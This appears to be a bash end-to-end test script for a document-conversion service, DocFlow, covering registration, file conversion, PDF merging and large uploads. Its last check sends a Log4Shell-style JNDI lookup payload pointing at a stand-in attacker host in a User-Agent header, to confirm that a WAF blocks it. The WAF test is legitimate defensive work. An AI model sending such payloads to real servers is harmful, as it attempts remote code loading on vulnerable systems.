#!/usr/bin/env bash
# End-to-end test against a running DocFlow stack (real Gotenberg, real worker).
# Usage:  docker compose up -d --build && ./scripts/e2e.sh [base_url]
# Downloads follow redirects (-L), so the same test works when the app
# hands out S3 download links on AWS.
set -euo pipefail

BASE="${1:-http://localhost}"
WORK=$(mktemp -d)
JAR="$WORK/cookies"
trap 'rm -rf "$WORK"' EXIT

say() { printf '\n==> %s\n' "$*"; }

say "Waiting for $BASE/healthz"
for i in $(seq 1 60); do
  if curl -fs "$BASE/healthz" >/dev/null; then break; fi
  [ "$i" -eq 60 ] && { echo "App never became healthy"; exit 1; }
  sleep 5
done
curl -fs "$BASE/healthz"; echo

say "Registering a test user"
EMAIL="e2e-$(date +%s)@example.com"
curl -fs -c "$JAR" -b "$JAR" -o /dev/null -X POST \
  --data-urlencode "email=$EMAIL" --data-urlencode "password=password123" "$BASE/register"

latest_job_id() {
  curl -fs -b "$JAR" "$BASE/dashboard" | grep -o 'data-job="[^"]*"' | head -1 | cut -d'"' -f2
}

wait_for_job() {
  local id=$1 status
  for i in $(seq 1 60); do
    status=$(curl -fs -b "$JAR" "$BASE/jobs/$id/status" | python3 -c 'import sys, json; print(json.load(sys.stdin)["status"])')
    case "$status" in
      done) echo "job $id: done"; return 0 ;;
      failed) echo "job $id FAILED:"; curl -fs -b "$JAR" "$BASE/jobs/$id/status"; echo; return 1 ;;
    esac
    sleep 2
  done
  echo "job $id timed out (last status: $status)"; return 1
}

check_pdf() {
  local file=$1
  if [ "$(head -c 5 "$file")" != "%PDF-" ]; then
    echo "$file is not a PDF"; head -c 200 "$file"; exit 1
  fi
  echo "$file is a valid PDF ($(wc -c < "$file") bytes)"
}

say "Converting a text file to PDF"
printf 'Hello from the DocFlow end-to-end test.\n' > "$WORK/hello.txt"
curl -fs -c "$JAR" -b "$JAR" -o /dev/null -F "file=@$WORK/hello.txt" "$BASE/convert"
JOB1=$(latest_job_id)
wait_for_job "$JOB1"
curl -fsL -b "$JAR" -o "$WORK/one.pdf" "$BASE/jobs/$JOB1/download"
check_pdf "$WORK/one.pdf"

say "Converting a second file"
printf 'Second page.\n' > "$WORK/second.txt"
curl -fs -c "$JAR" -b "$JAR" -o /dev/null -F "file=@$WORK/second.txt" "$BASE/convert"
JOB2=$(latest_job_id)
wait_for_job "$JOB2"
curl -fsL -b "$JAR" -o "$WORK/two.pdf" "$BASE/jobs/$JOB2/download"
check_pdf "$WORK/two.pdf"

say "Merging the two PDFs"
curl -fs -c "$JAR" -b "$JAR" -o /dev/null \
  -F "files=@$WORK/one.pdf" -F "files=@$WORK/two.pdf" "$BASE/merge"
JOB3=$(latest_job_id)
wait_for_job "$JOB3"
curl -fsL -b "$JAR" -o "$WORK/merged.pdf" "$BASE/jobs/$JOB3/download"
check_pdf "$WORK/merged.pdf"

say "Converting a 1.5 MB image (large uploads are buffered to disk in /tmp)"
python3 - "$WORK/large.png" <<'PY'
import os, struct, sys, zlib
w = h = 700  # random pixels don't compress, so this is about 1.5 MB
raw = b"".join(b"\x00" + os.urandom(w * 3) for _ in range(h))
def chunk(kind, data):
    return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data) & 0xFFFFFFFF)
with open(sys.argv[1], "wb") as f:
    f.write(b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0))
            + chunk(b"IDAT", zlib.compress(raw, 1)) + chunk(b"IEND", b""))
PY
echo "large.png is $(wc -c < "$WORK/large.png") bytes"
curl -fs -c "$JAR" -b "$JAR" -o /dev/null -F "file=@$WORK/large.png" "$BASE/convert"
JOB4=$(latest_job_id)
wait_for_job "$JOB4"
curl -fsL -b "$JAR" -o "$WORK/large.pdf" "$BASE/jobs/$JOB4/download"
check_pdf "$WORK/large.pdf"

if [[ "$BASE" == https://* ]]; then
  say "Checking the WAF blocks a Log4Shell-style attack (AWS only)"
  CODE=$(curl -s -o /dev/null -w '%{http_code}' -H 'User-Agent: ${jndi:ldap://attacker.example/a}' "$BASE/")
  if [ "$CODE" != "403" ]; then
    echo "Expected the WAF to block the request with 403, got $CODE"; exit 1
  fi
  echo "WAF blocked the attack (HTTP 403)"
fi

say "All end-to-end checks passed"
